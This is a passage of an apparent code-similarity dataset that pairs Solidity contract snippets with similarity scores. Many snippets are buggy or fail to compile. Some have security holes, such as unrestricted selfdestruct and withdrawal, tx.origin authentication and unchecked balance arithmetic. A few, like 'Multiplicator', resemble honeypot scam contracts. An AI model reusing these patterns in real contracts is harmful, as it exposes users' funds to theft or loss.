    event res(uint indexed out)
    function echo(uint in) {
         res(i);
    }
}",0.6192205237089102,"contract Emitter {
    event Emit(uint x);
    function emit(uint x) {
        Emit(x);
    }
}"
"contract A {
    B b;

    constructor(B _b) public {
        b = _b;
    }  

    function() external payable {
        (bool success, bytes memory result) = address(b).call.value(msg.value)("""");

        revert();
    }
}",0.63260454116889,"contract allowanceRecipient {

    function receiveApproval(address _from, uint256 _value, address _inContract, bytes memory _extraData) public returns (bool success);

}"
"contract TestImmutable {
    uint256 public immutable a;

    
    constructor (uint256 _a) public {
        a = _a;
    }

    
    function setA (uint256 _a) public {
        a = _a;
    }
}",0.6298655273340629,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract WithDraw is Ownable {

  Token token;
  mapping(address => uint256) public redeemBalanceOf;
  event BalanceSet(address indexed beneficiary, uint256 value);
  event Redeemed(address indexed beneficiary, uint256 value);

  function WithDraw() public {
      address _tokenAddr = MY_TOKEN_ADDR;
      token = Token(_tokenAddr);
  }

function setBalances(address[] dests, uint256[] values) onlyOwner public {
    uint256 i = 0; 
    while (i < dests.length){
        if(dests[i] != address(0)) 
        {
            uint256 toSend = values[i] * 10**18;
            redeemBalanceOf[dests[i]] += toSend;
            BalanceSet(dests[i],values[i]);
        }
        i++;
    }
  }

  function redeem(uint256 quantity) external{
      uint256 baseUnits = quantity * 10**18;
      uint256 senderEligibility = redeemBalanceOf[msg.sender];
      uint256 tokensAvailable = token.balanceOf(this);
      require(senderEligibility >= baseUnits);
      require( tokensAvailable >= baseUnits);
      if(token.transfer(msg.sender,baseUnits)){
        redeemBalanceOf[msg.sender] -= baseUnits;
        Redeemed(msg.sender,quantity);
      }
  }

  function removeBalances(address[] dests, uint256[] values) onlyOwner public {
    uint256 i = 0; 
    while (i < dests.length){
        if(dests[i] != address(0)) 
        {
            uint256 toRevoke = values[i] * 10**18;
            if(redeemBalanceOf[dests[i]]>=toRevoke)
            {
                redeemBalanceOf[dests[i]] -= toRevoke;
                BalanceCleared(dests[i],values[i]);
            }
        }
        i++;
    }

}
",0.6755660484144039,"contract AirDrop is Ownable {

  Token token;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  modifier whenDropIsActive() {
    assert(isActive());

    _;
  }

  function AirDrop () public {
      address _tokenAddr = 0xc8Cac7672f4669685817cF332a33Eb249F085475;
      token = Token(_tokenAddr);
  }

  function isActive() public constant returns (bool) {
    return (
        tokensAvailable() > 0
    );
  }

  function sendTokensSingleValue(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    uint256 toSend = value * 10**18;
    while (i < dests.length) {
        sendInternally(dests[i] , toSend, value);
        i++;
    }
  }  

  function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
    if(recipient == address(0)) return;

    if(tokensAvailable() >= tokensToSend) {
      token.transfer(recipient, tokensToSend);
      TransferredToken(recipient, valueToPresent);
    } else {
      FailedTransfer(recipient, valueToPresent); 
    }
  }


  function tokensAvailable() public constant returns (uint256) {
    return token.balanceOf(this);
  }

  function destroy() public onlyOwner {
    uint256 balance = tokensAvailable();
    require (balance > 0);
    token.transfer(owner, balance);
    selfdestruct(owner);
  }
}"
"contract A {
    modifier only (uint test) {
        require(test > 5);
        _;
    }
    function test(uint test) public only(test) returns(uint) {
        return addSome(test);
    }
    function addSome(uint number) internal returns(uint) {
        return number + 5;
    }
}",0.6430302109546479,"contract SafeAddSub {
    function safeAdd(uint a, uint b) internal returns (uint) {
        require(a + b >= a);
        return a + b;
    }

    function safeSub(uint a, uint b) internal returns (uint) {
        require(b <= a);
        return a - b;
    }
}"
"contract B is A {
    modifier only (uint test) {
        require(test < 10);
        _;
    }
    function test(uint test) public only(test) returns(uint) {
        return super.test(test);
    }
    function addSome(uint number) internal returns(uint) {
        return number + 10;
    }
}",0.6187410667665212,"contract SafeMath {

    function safeAdd(uint a, uint b) internal returns (uint) {

        uint c = a + b;

        assert(c>=a && c>=b);

        return c;

     }



    function safeSub(uint a, uint b) internal returns (uint) {

        assert(b <= a);

        return a - b;

    }

}"
"contract Registry {

    mapping(bytes32 => address) public ID;
    mapping(address => address) public Contract;

    event log(bytes32,address);
    function register(bytes32 _id) {
        ID[_id] = tx.origin;
        Contract[tx.origin] = msg.sender;
    }

    function getPublicAddress(bytes32 _id) constant returns (address) {
        log(_id,ID[_id]);
        return (ID[_id]);
    }

    function getContractAddress(bytes32 _id) constant returns (address) { 
        log(_id,Contract[ID[_id]]);
        return Contract[ID[_id]];
    } 
}",0.6188354901075114,"contract PrivateServiceRegistryInterface {
  
  
  
  function register(address _service) internal returns (uint256 serviceId) {}

  
  
  
  function isService(address _service) public constant returns (bool) {}

  
  
  
  function services(uint256 _serviceId) public constant returns (address _service) {}

  
  
  
  function ids(address _service) public constant returns (uint256 serviceId) {}

  event ServiceRegistered(address _sender, address _service);
}"
"contract User { 
    address owner;
    Registry registry;
    
    function register(bytes32 _id) {
        registry.register(_id);
    }
    function getContractAddress(bytes32 _id) constant returns (address){
        return registry.getContractAddress(_id);
    }
    function getPublicAddress(bytes32 _id) constant returns (address) {
        return registry.getPublicAddress(_id);
    }
    function setRegister(address _addr){
        registry = Registry(_addr);
    }
}",0.6206823653153227,"contract Certifier {
	event Confirmed(address indexed who);
	event Revoked(address indexed who);
	function certified(address) public constant returns (bool);
	function get(address, string) public constant returns (bytes32);
	function getAddress(address, string) public constant returns (address);
	function getUint(address, string) public constant returns (uint);
}"
"contract GiveRefreceId {

    mapping(address => uint256) public referenceid;
    address[] public clients;
    uint256 idcounter;

    event createdId(address user, uint256 id);

    function giveRefrenceId() public returns (uint256)  { 
        require(referenceid[msg.sender]==0);
        idcounter += 1;
        clients.push(msg.sender);
        referenceid[msg.sender] = idcounter;
        emit createdId(masg.sender,idcounter);
        return idcounter;

    }


    function  getrefrnceId() public view returns(uint256) {
        return referenceid[msg.sender];
    }
}",0.6212630053165489,"contract BasicToken is ERC20Basic {

    using SafeMath for uint256;



    mapping(address => uint256) balances;



    

    function transfer(address _to, uint256 _value) public returns (bool) {

        require(_to != address(0));

        require(_value <= balances[msg.sender]);



        

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    

    function balanceOf(address _owner) public view returns (uint256) {

        return balances[_owner];

    }



}"
"contract A {

   address[] public addElements;

   function A() payable {

   }

   function create(string x,string y) returns (address a) {
       B obj = new B(x,y);
       addElements.push(obj);
       return obj;
   }

   function contribute(address x) payable returns (bool) {

    if(msg.value == 0) return false;

    address contributor = msg.sender;

    bool isFailure = B(x).donate.value(msg.value)(contributor);

    return isFailure;

   }


   function getElements() returns (address[] ) {
       return addElements;
   }

}",0.6476499474228339,"contract ERC20 {
    
    string public name;
    function totalSupply() constant returns (uint);
    function balanceOf(address _owner) constant returns (uint);
    function allowance(address _owner, address _spender) constant returns (uint);
    function transfer(address _to, uint _value) returns (bool);
    function transferFrom(address _from, address _to, uint _value) returns (bool);
    function approve(address _spender, uint _value) returns (bool);

}"
"contract B {

     struct details  {
        string name;
        string desc;
    } 

   details public param;

   function B(string a,string b) {
       param.name = a;
       param.desc = b;
   }

   function donate(address x) payable returns (bool) {

    
    return true;

   }

   function getInfo () constant returns (string name, string desc) {
        return (param.name,param.desc);
   }

}",0.6381980080602131,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    uint256 c;
    
    function addSomeMoreRandomStuff(address[] memory tokens) public {
        c = c + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract Banker {
    string name;
    address[] public contracts;

    constructor(string _name) public {
        name = _name;
    }
    
    function createMoney (string _name, string _territory) public{
        Money m = new Money(_name, _territory);
        contracts.push(m);
    }
    
    function howMany() public constant returns (uint){
        return contracts.length;
    }
    
    function showMoney(uint index) public constant returns (address) {
        assert (index < contracts.length);

        
        return contracts[index];
    }

}",0.6352525609183146,"contract Collectible is Icollectible {
  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string name, string symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  
  function name() public view returns(string) {
    return _name;
  }

  
  function symbol() public view returns(string) {
    return _symbol;
  }

  
  function decimals() public view returns(uint8) {
    return _decimals;
  }
}"
"contract MyContract {

    struct Block {
        address landlord;
        uint sellPrice;
    }
    Block[101][101] public blocks; 

    Storage strg;

    function setStorage(address addr) public { strg = Storage(addr); }

    function setNewBlockOwner(uint8 _x, uint8 _y, address _newOwner) public returns (bool) {  
        strg.setBlockOwner(_x, _y, _newOwner);    
        blocks[_x][_y].landlord = _newOwner;        
        return true;
    }
}",0.6078226050091943,"contract Ownable {
    address public _owner;

    
    constructor () public {
        _owner = msg.sender;
    }

    
    modifier onlyOwner() {
        if (msg.sender != _owner) {
            revert(""Error: sender is not same owner"");
        }
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            _owner = newOwner;
        }
    }

    
    function owner() public view returns (address) {
        return _owner;
    }
}"
"contract Scope {

    modifier checkScope {
        uint x = 100;
        _;
    }

    function doSomething() public pure checkScope returns(uint) {
        
    }
}",0.608825096724485,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Test {

    function send() payable public {
        address payable recipient = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
        recipient.transfer(1000000000000000000); 
    }

    function contractBalance() public view returns(uint) {
        return address(this).balance;
    }

    function getContractBalance() public {
        msg.sender.transfer(address(this).balance);
    }

    function destroyContract() public {
        selfdestruct(msg.sender); 
    }
}",0.6362195071288317,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract SimpleContract {

bool public finished;

function () public payable  {
}

constructor() payable  public {
}

function paybackEther(bool newfinished) public  {

finished = newfinished;        
selfdestruct(msg.sender);
}

}",0.6795665408184924,"contract truth{
    bool public x;
    address payable z;
    
    constructor() public{
        z = msg.sender;
    }
    
    function vote(bool y) public payable{
        x=y;
    }
    
    function transf() public{
        z.transfer(address(this).balance);
    }
}"
"contract Db {

    mapping (address => mapping (bytes32 => bytes32)) data;

    

    function getAge(address usr) public view returns (uint) {
        return getUint(usr, keccak256('age'));
    }

    function setAge(address usr, uint age) public {
        setUint(usr, keccak256('age'), age);
    }

    function getName(address usr) public view returns (string) {
        return getString(usr, keccak256('name'));
    }

    function setName(address usr, string name) public {
        setString(usr, keccak256('name'), name);
    }

    

    function getUint(address usr, bytes32 ky) internal view returns (uint) {
        return uint(data[usr][ky]);
    }

    function setUint(address usr, bytes32 ky, uint val) internal {
        data[usr][ky] = bytes32(val);
    }

    function getString(address usr, bytes32 ky) internal view returns (string) {
        return bytes32ToString(data[usr][ky]);
    }

    function setString(address usr, bytes32 ky, string val) internal {
        data[usr][ky] = stringToBytes32(val);
    }

    

    function bytes32ToString(bytes32) internal returns (string) {
         ..
    }

    function stringToBytes32(string) internal returns (bytes32) {
         ..
    }

}",0.6621019510167098,"contract TokenReg {
  function register(address _addr, string _tla, uint _base, string _name) payable returns (bool);
  function registerAs(address _addr, string _tla, uint _base, string _name, address _owner) payable returns (bool);
  function unregister(uint _id);
  function setFee(uint _fee);
  function tokenCount() constant returns (uint);
  function token(uint _id) constant returns (address addr, string tla, uint base, string name, address owner);
  function fromAddress(address _addr) constant returns (uint id, string tla, uint base, string name, address owner);
  function fromTLA(string _tla) constant returns (uint id, address addr, uint base, string name, address owner);
  function meta(uint _id, bytes32 _key) constant returns (bytes32);
  function setMeta(uint _id, bytes32 _key, bytes32 _value);
  function transferTLA(string _tla, address _to) returns (bool success);
  function drain();
  uint public fee;
}"
"contract C {
               function f(uint a) private returns(uint b) { 
                             return a + 1;
               }

      }",0.6750902795749456,"contract Now
{
    function date() public view returns(uint) {
        while(true){
            
        }
        return now;
    }
}"
"contract D {
              function readData() public {
                       C c = new C();
                       uint local = c.f(7); 

             }
    }",0.6272761533762925,"contract Stats {
  function getDay( uint128 day) public view returns (uint);
}"
"contract SmartToken {

        mapping(address => uint) tokens;

        event OnamountChanged(address indexed _fromAddress, uint amount);


        function transfer(address fromAddress, address toAddress, uint amount) returns (bool success) {
            
            if (fromAddress == toAddress) {
                return false;
            }


            if ((tokens[fromAddress] - amount) < 0) {
                
                token[toAddress] += tokens[fromAddress];
                tokens[fromAddress] = 0;
            } else {
                token[toAddress] += amount;
                tokens[fromAddress] -= amount;
            }

            OnamountChanged(fromAddress, tokens[fromAddress]);
            return true;
        }
    }",0.6486185478366956,"contract TokenVault is Ownable {
    address owner;
    event TokenTransfer(address indexed to, address token, uint amount);
    
    function withdrawTokenTo(address token, address to) public onlyOwner returns (bool) {
        uint amount = balanceOfToken(token);
        if (amount > 0) {
            TokenTransfer(to, token, amount);
            return Token(token).transfer(to, amount);
        }
        return false;
    }
    
    function balanceOfToken(address token) public constant returns (uint256 bal) {
        bal = Token(token).balanceOf(address(this));
    }
}"
"contract UintInt {

    function asBytes32(int i, uint u) public pure returns(bytes32 _i, bytes32 _u) {
        return(bytes32(i), bytes32(u));
    }

    function asUint(int i) public pure returns(uint u) {
        return(uint(i));
    }

    function underflow() public pure returns(int i, uint u, bytes32 bi, bytes32 bu) {
        i = int(0)-int(1);
        u = uint(0)-uint(1);
        bi = bytes32(i);
        bu = bytes32(u);
    }
}",0.6059422632171474,"contract VatLike {
    function urns(bytes32, address) public view returns (uint, uint);
    function hope(address) public;
    function flux(bytes32, address, address, uint) public;
    function move(address, address, uint) public;
    function frob(bytes32, address, address, address, int, int) public;
    function fork(bytes32, address, address, int, int) public;
}"
"contract Sharer {
    function sendHalf(address addr) payable returns (uint balance) {
        require(msg.value % 2 == 0); 
        uint balanceBeforeTransfer = this.balance;
        addr.transfer(msg.value / 2);
        
        
        
        assert(this.balance == balanceBeforeTransfer - msg.value / 2);
        return this.balance;
    }
}",0.6141997408014703,"contract Multiplicator
{
    address public Owner = msg.sender;
   
    function()payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}"
"contract Crowdsale {

   tokenA public tokenRewardA;
   tokenB public tokenRewardB;

   mapping(address => uint256) balancesA;
   mapping(address => uint256) balancesB;

   function Crowdsale(address _addressOfTokenA, address _addressOfTokenB) {
        tokenRewardA = tokenA(_addressOfTokenA);
        tokenRewardB = tokenB(_addressOfTokenB); 
   }
   function () payable {
      uint amount = msg.value;
      uint tokensA = 
      tokenRewardA.transfer(msg.sender, tokensA);
      balancesA[msg.sender] += tokensA;
   }

   function vote(uint256 _amount) {
      
      
      
      
      if (balancesA[msg.sender] == 0) {
         
         uint tokensB = 
         tokenRewardB.transfer(msg.sender, tokensB);
         balancesB[msg.sender] += tokensB;
         
         
      } 
   }
}",0.6238539211031309,"contract AirDrop{
    address owner;
    mapping(address => uint256) tokenBalance;
    
    function AirDrop(){
        owner=msg.sender;
    }
    
    function transfer(address _token,address _to,uint256 _amount) public returns(bool){
        require(msg.sender==owner);
        ERC20 token=ERC20(_token);
        return token.transfer(_to,_amount);
    }
    
    function doAirdrop(address _token,address[] _to,uint256 _amount) public{
        ERC20 token=ERC20(_token);
        for(uint256 i=0;i<_to.length;++i){
            token.transferFrom(msg.sender,_to[i],_amount);
        }
    }
    
    function doAirdrop2(address _token,address[] _to,uint256 _amount) public{
        ERC20 token=ERC20(_token);
        for(uint256 i=0;i<_to.length;++i){
            token.transfer(_to[i],_amount);
        }
    }
}"
"contract Test {
    uint256 a = 1;
    uint256 b = 1;

    
    function deleteOne() external {
        a = 0;
    }

    
    function deleteBoth() external {
        a = 0;
        b = 0;
    }

    function reset() external {
        a = 1;
        b = 1;
    }
}",0.6417090406995224,"contract IChai is IERC20 {
    function POT() public view returns (IPot);

    function join(address dst, uint256 wad) external;

    function exit(address src, uint256 wad) external;
}"
"contract UserB {

  address public owner;
  UserA public user; 
  string public color;

  function UserB(address _user) {
    owner = msg.sender;
    user = UserA(_user);
  }

  function delegateCall(string c) {
    user.setColor(c);
  }
}",0.663801984836,"contract Owned {

    address public owner;



    function Owned() public {

        owner = msg.sender;

    }



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function setOwner(address _owner) onlyOwner public {

        owner = _owner;

    }

}"
"contract Approve is ApproveInterface {
    uint x;
    function approve(address to, uint256 tokenId, bytes32 other) public {
        x = 1;
    }
}",0.6551864245506145,"contract HeroLogicInterface {
    function isTransferAllowed(address _from, address _to, uint256 _tokenId) public view returns (bool);
}"
"contract ContractFoo {
  mapping (address=>uint) somemapping; 

  function getMapping(address _address) public constant returns (uint) {
    return somemapping[addr]
  }
}",0.6564301356243186,"contract EtherandomProxyI {
  function getContractAddress() constant returns (address _addr); 
  function getCallbackAddress() constant returns (address _addr); 
}"
"contract User {
    string publicKey;

    function setPublicKey(string _publicKey)
    {
        publicKey = _publicKey;
    }

    function getPublicKey() returns (string) {
        return publicKey;
    }

 }",0.6532042631221644,"contract Pgp {

  mapping(address => string) public addressToPublicKey;



  function addPublicKey(string publicKey) external {

    addressToPublicKey[msg.sender] = publicKey;

  }

}"
"contract Uniqueness {
    mapping(bytes32 => bool) public isUsed;

    function claimId(bytes32 key) public returns(bool success) {
        require(!isUsed[key]);
        isUsed[key]=true;
        return true;
    }

    function createKey(address user, uint salt) public view returns(bytes32 key) {
        return keccak256(abi.encodePacked(user, salt, address(this), block.number));
    }
}",0.6294900433914119,"contract ICourt is Ownable {



    function getCaseId(address applicant, address respondent, bytes32 deal, uint256 date, bytes32 title, uint256 amount) 

        public pure returns(bytes32);



    function getCaseStatus(bytes32 caseId) public view returns(uint8);



    function getCaseVerdict(bytes32 caseId) public view returns(bool);

}"
"contract Caller {

  Constant public c;
  Writer public w;

  event LogReturnedValue(uint valueReceived);

  function Caller() {
    c = new Constant();
    w = new Writer();
  }

  

  function callConstant() 
    public
    returns(uint x)
  {
    uint gotVal = c.returnValue();
    LogReturnedValue(gotVal);
    return gotVal;
  }

  function callWriter() 
    public
    returns(uint y)
  {
    uint gotVal = w.returnValue();
    LogReturnedValue(gotVal);
    return gotVal;        
  }
}",0.6009919715205723,"contract IBalanceInfo {

    function totalBalance() public view returns(uint);



    function availableBalance() public view returns(uint);



    

    function reserveBalance(uint value) internal returns(uint);



    

    function reservedBalance() public view returns(uint);



    

    function freeBalance(uint value) internal returns(uint);



    event BalanceReserved(uint value, uint total);

    event BalanceFreed(uint value, uint total);

}"
"contract Constant {

  function returnValue() 
    public
    constant 
    returns(uint X)
  {
    return 1;
  }


  uint public counter;

  function returnValue()
    public
    returns(uint Y)
  {
    counter++;
    return 2;
  }

}",0.6896370005952106,"contract ITokenMetadata {



    

    

    



    function symbol()

        public

        constant

        returns (string);



    function name()

        public

        constant

        returns (string);



    function decimals()

        public

        constant

        returns (uint8);

}"
"contract StorageTest {

    string string1; 

    function func1(string param1) public pure { 
        string memory string2 = ""foo"";  
    }
}",0.6774318334665036,"contract Foo {
  string public foo;

  function getFoo() public {
    string memory _foo = foo;
    string memory _bar = foo;
  }
}"
"contract Caller {
  function callCallee() public returns(uint responseCode) {
    uint response = callee.doSomething();
    if(response == 1) { ...
    if(response == 2) { ...
...",0.6000671966801483,"contract Client4 {
    
    
    
    
    
    
    function callback(uint256 id, string response1, string response2, string response3, string response4) external;
}"
"contract C {
    event EventSendCoin(address indexed sender, address indexed receiver, uint256 amount);

    function sendCoin(address receiver, uint amount) returns (bool sufficient) {
        
        EventSendCoin(msg.sender, receiver, amount);
        return true;
    }
}",0.6546473485398957,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract ItemListContract {

    function ItemListContract();

    function addItem(bytes name, uint16 iid, bytes code, uint val);

    function countItemList() constant returns (uint count);

    function removeItem(bytes code);

    function getItem(bytes code) constant returns (bytes iname, uint val);
}",0.6569009847364623,"contract FiatContract {
  function ETH(uint _id) constant returns (uint256);
  function USD(uint _id) constant returns (uint256);
  function EUR(uint _id) constant returns (uint256);
  function GBP(uint _id) constant returns (uint256);
  function updatedAt(uint _id) constant returns (uint);
}"
"contract MultiReturns {
    struct MyThing {
        uint256 a;
        uint256 b;
        uint256 c;
    }

    function getPieces() internal pure returns(uint256 a, uint256 b, uint256 c) {
        return (123, 456, 789);
    }

    function doWork() public {
        (uint256 a, uint256 b, uint256 c) = getPieces();
        MyThing memory t = MyThing(a, b, c);
    }
}",0.6742479028653913,"contract SafeMath {

  function safeSub(uint256 a, uint256 b) internal returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint256 a, uint256 b) internal returns (uint256) {

    uint256 c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  function assert(bool assertion) internal {

    if (!assertion) throw;

  }

}"
"contract s {
    uint private _min = 0;
    uint private _max = 2;

    function go() public view returns(string) {
        return string(abi.encodePacked(""\""min\"":"", uint2str(_min), "",\""max\"":"", uint2str(_max), "",""));
    }

    function uint2str(uint i) internal pure returns (string){
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0){
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0){
            bstr[k--] = byte(48 + i % 10);
            i /= 10;
        }
        return string(bstr);
    }
}",0.6008493377152113,"contract EllipticPrize16x is IFunctionPrize {

    function calcModulo(uint fMax) internal pure returns (uint) {

        uint sqr = fMax * fMax * fMax * fMax;

        return sqr * sqr * sqr * sqr;

    }



    function calcPrizeX(uint x, uint fMax, uint maxPrize) public view returns (uint) {

        uint xsq = (x + 1) * (x + 1);

        uint xq = xsq * xsq;

        uint xspt = xq * xq;

        return (xspt * xspt * maxPrize) / calcModulo(fMax);

    }



    function prizeFunctionName() public view returns (string) {

        return ""E16x"";

    }

}"
"contract A {
    struct Node { 
        uint256 value;
        bytes32 nextNode;
    }
    bytes32 head;
    mapping(bytes32 => Node) list;

    function push(uint256 value) public {
        bytes32 key = keccak256(abi.encodePacked(value, head));
        Node memory newNode = Node(value, head);

        list[key] = newNode;
        head = key;
    }

    function headValue() public view returns(uint256) {
        require(head != 0);

        return list[head].value;
    }

    function sum() public view returns(uint256) {
        bytes32 current = head;
        uint256 total = 0;
        while (current != 0) {
            total += list[current].value;
            current = list[current].nextNode;
        }

        return total;
    }

}",0.6002129688727064,"contract PriceFeed is DSThing {

    uint128 val;

    uint32 public zzz;



    function peek() public view returns (bytes32, bool) {

        return (bytes32(uint256(val)), block.timestamp < zzz);

    }



    function read() public view returns (bytes32) {

        assert(block.timestamp < zzz);

        return bytes32(uint256(val));

    }



    function post(uint128 val_, uint32 zzz_, address med_) public payable note auth {

        val = val_;

        zzz = zzz_;

        (bool success, ) = med_.call(abi.encodeWithSignature(""poke()""));

        require(success, ""The poke must succeed"");

    }



    function void() public payable note auth {

        zzz = 0;

    }



}"
"contract NumTest {

    int8 i;

    function NumTest() {
        i = -1;
    }

    function number() constant returns (int8 num) {
        return i;    
    }
}",0.6271968134683702,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract C {
    uint[] array;
    
    function func() {
        delete array[1];
    }
}",0.6430183101119157,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract WETH is IWETH {
  string public name = ""Wrapped Ether"";
  string public symbol = ""WETH"";
  uint8  public decimals = 18;

  function deposit() public payable {
    _mint(msg.sender, msg.value);
    emit Deposit(msg.sender, msg.value);
  }

  function withdraw(uint amount) public {
    require(balanceOf(msg.sender) >= amount);
    address payable recipient = msg.sender;
    _burn(msg.sender, amount);
    recipient.transfer(amount);
    emit Withdrawal(recipient, amount);
  }

  function withdraw(uint amount, address payable recipient) public {
    require(balanceOf(msg.sender) >= amount);
    recipient.transfer(amount);
    _burn(msg.sender, amount);
    emit Withdrawal(recipient, amount);
  }
}",0.6988714928919747,"contract ETHDeposit is Owned {
    address public Owner;
    mapping (address => uint) public Deposits;

    event Deposit(uint amount);
    event Withdraw(uint amount);
    
    function ETHDeposir() {
        Owner = msg.sender;
        deposit();
    }
    
    function() payable {
        revert();
    }

    function deposit() payable {
        if (msg.value >= 500 finney)
            if (Deposits[msg.sender] + msg.value >= Deposits[msg.sender]) {
                Deposits[msg.sender] += msg.value;
                Deposit(msg.value);
            }
    }
    
    function withdraw(uint amount) payable onlyOwner {
        if (Deposits[msg.sender] > 0 && amount <= Deposits[msg.sender]) {
            msg.sender.transfer(amount);
            Withdraw(amount);
        }
    }
    
    function kill() onlyOwner {
        if (this.balance == 0)
            selfdestruct(msg.sender);
    }
}"
"contract Foo {
    function Foo() {}

    function chop() public returns (bytes32)
    {
        return ""Chop!!!"";
    }
}",0.6647038901447324,"contract MSD4 {

   

    function greenOnFanChun () public pure returns (bool) {

        return true;

    }

}"
"contract Caller {

  test public t;

  function Caller() {
    t = new test();
  }

  function callIt(address theAddress)
    public
    returns(bool success)
  {
    t = test(t); <===== here the other contract address can be called t = test([OtherContractAddress]); example: test(0x12345);
    bool result = t.FunctionX(theAddress);
    return result;
  }
}",0.6203267538116116,"contract Interface { 
    
    
    function Supply() public constant returns (uint);
    
    
    function balanceOf(address tokenOwner) public constant returns (uint balance);
    
    
    function transfer(address to, uint tokens) public returns (bool success);
    
    
    event Transfer(address indexed from, address indexed to, uint tokens);

}"
"contract Random {
    uint nonce;


    function random() internal returns (uint) {
    uint random = uint(keccak256(now, msg.sender, nonce)) % 100;
    nonce++;
    return random;
    }

    function getRandom() external view returns (uint) {
        return random();
    }
}",0.6332557135863199,"contract SafeMath {

    function safeAdd(uint a, uint b) internal returns (uint) {

        uint c = a + b;

        assert(c>=a && c>=b);

        return c;

     }



    function safeSub(uint a, uint b) internal returns (uint) {

        assert(b <= a);

        return a - b;

    }

}"
"contract YourNewContract {

    
    function sendTheToken(address _from, address _to, uint256 _value) public {

        
        address tokenContractAddress = <TokenAddress>;

        
        TheTokenContract token = TheTokenContract(tokenContractAddress);

        
        bool sendSuccess = token.transferFrom(_from, _to, _value);

    }

}",0.6384940827724532,"contract TokensContract {

    function balanceOf(address who) public constant returns (uint256);

    function transferFrom(address _from, address _to, uint _value) returns (bool success);

    function approve(address _spender, uint _value) returns (bool success);

}"
"contract Test {

  string[] public tests;

  event LogAppendedData(address sender, string data);

  function totalTestsCount() view public returns (uint) {
    return tests.length;
  }

  function appendData(string test_data) public returns (uint count) {
    emit LogAppendedData(msg.sender, test_data);
    return tests.push(test_data);
  } 

  function showTest(uint row) view public returns (string){
    return tests[row];
  } 

}",0.6265998951994023,"contract TokenLike {
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
}"
"contract Random {

    uint nonce = 0;

    function random() public returns(uint) {
        nonce += 1;
        return uint(keccak256(abi.encodePacked(nonce)));
    }
}",0.6143265216593145,"contract PureLoop
{
    function execute() public pure returns (uint output) {
        uint num;
        num +=execute();
        return num++;
    }
}"
"contract contractA {
    function blah(int x, int y) public payable returns (int) {
        return x+y;
    }
}",0.6959805566218005,"contract SaiVox {
    function par() public returns (uint);
    function way() public returns (uint);
}"
"contract C {          
  function pay(uint n, address payable d) public returns(bytes memory theMessage) { 
    (bool success, bytes memory returnMessage)  = d.call.value(n)("""");  
    require(success, ""D1 did not accept the funds.""); 
    return returnMessage;  
  } 
}",0.6371908847767217,"contract DSProxyInterface {

    
    
    
    
    

    function execute(address _target, bytes memory _data) public payable returns (bytes32);

    function setCache(address _cacheAddr) public payable returns (bool);

    function owner() public returns (address);
}"
"contract D1 {
  uint public bal = 0;
  function() external payable { 
    bal+=msg.value; 
  }        
}",0.666733747087439,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract A {
    modifier isNotAContract(){
        require (msg.sender == tx.origin, 'Contracts are not allowed to interact.');
        _;
    } 

    function f() public isNotAContract {
        
    }
}",0.6004562972391186,"contract Owned {
    address public contractOwner;

    function Owned() {
        contractOwner = msg.sender;
    }

    modifier onlyContractOwner() {
        if (contractOwner == msg.sender) {
            _;
        }
    }
}"
"contract B {
    A a = new A();
    function f() public {
        a.f();
    }
}",0.6237662031180009,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract A {
    address public my_address;

    function A() {
        my_address= this;
    }
}",0.6696348351897855,"contract DAO {

        function balanceOf(address addr) public returns (uint);

    }"
"contract B is A {
    function B() {
      
    }
}",0.6681288001283424,"contract test {
    function f() public { }
}"
"contract MyInterface {
    modifier contractOnly(){
        address contractAddress = this;
        if(msg.sender != contractAddress) throw; _
    }
    function transfer(address from, address to, uint amount) contractOnly returns (uint);
}",0.6548251817561261,"contract Token {
    function transferFrom(address from, address to, uint amount) returns(bool);
    function transfer(address to, uint amount) returns(bool);
    function balanceOf(address addr) constant returns(uint);
}"
"contract TheContract is MyInterface {
    function transfer(address from, address to, uint amount) contractOnly returns (uint) {
        ...
    }

